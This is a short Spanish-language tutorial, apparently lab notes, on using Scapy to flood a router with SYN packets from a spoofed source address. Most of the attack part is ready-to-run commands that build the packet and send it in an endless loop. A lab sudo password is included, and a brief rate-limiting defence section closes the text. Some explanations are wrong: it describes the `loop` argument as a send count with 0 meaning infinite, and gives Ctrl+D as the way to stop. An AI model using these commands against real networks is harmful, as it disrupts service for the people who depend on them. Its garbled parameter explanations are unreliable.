### Scapy 

Scapy es una poderosa herramienta de manipulación de paquetes de red que se puede utilizar para lanzar ataques DoS y DDoS. Scapy permite a los usuarios crear, enviar y recibir paquetes de red personalizados, lo que lo hace ideal para la creación de ataques de denegación de servicio.

```bash
sudo scapy (password: 123123)
```

#### Comandos básicos de Scapy

- Visualizar la información de los protocolos soportados: `ls()`
- Visualizar la información de un protocolo específico: `ls(protocolo)`
- Visualizar funcionalidades de Scapy: `lsc()`
- Averiguar que dispositivos están conectados a la red: `arping()`

## Ejemplo de ataque DoS y DDoS Utilizando Scapy

Enviaremos peticiones de conexión a un router desde una dirección IP de origen falsa, lo que provocará que el router no podroa identificar a quien responder y se inundara con peticiones SYN. Colapsando el router y dejando inaccesible la red.

1. Crear la estructura del paquete que se desea enviar al router:
```bash
a=IP(src="192.168.1.77",dst="192.168.1.1")/TCP(sport=RandShort(),dport=80,flags="S")
```
Argumentos:
- `IP`: Dirección IP de origen y destino.
- `src`: Dirección IP de origen.
- `dst`: Dirección IP de destino.
- `sport`: Puerto de origen.
- `dport`: Puerto de destino.
- `flags`: Bandera que indica el tipo de paquete (S: SYN).

2. Luego de haber creado la petición, se debe diseñar el bucle que enviará las peticiones al router:
```bash
send(a,loop=1)
```

Argumentos:
- `a`: Paquete a enviar.
- `loop`: Número de veces que se enviará el paquete (0: infinito).	

Para detener el ataque, se debe presionar `Ctrl + d`.


## ¿Cómo protegerse de los ataques DoS y DDoS?

- Lo mas importante es contar con reglas en el router y firewall que limiten el número de conexiones por segundo que se pueden realizar desde una dirección IP. 
- Detectar y bloquear las direcciones IP que estén realizando un número excesivo de conexiones.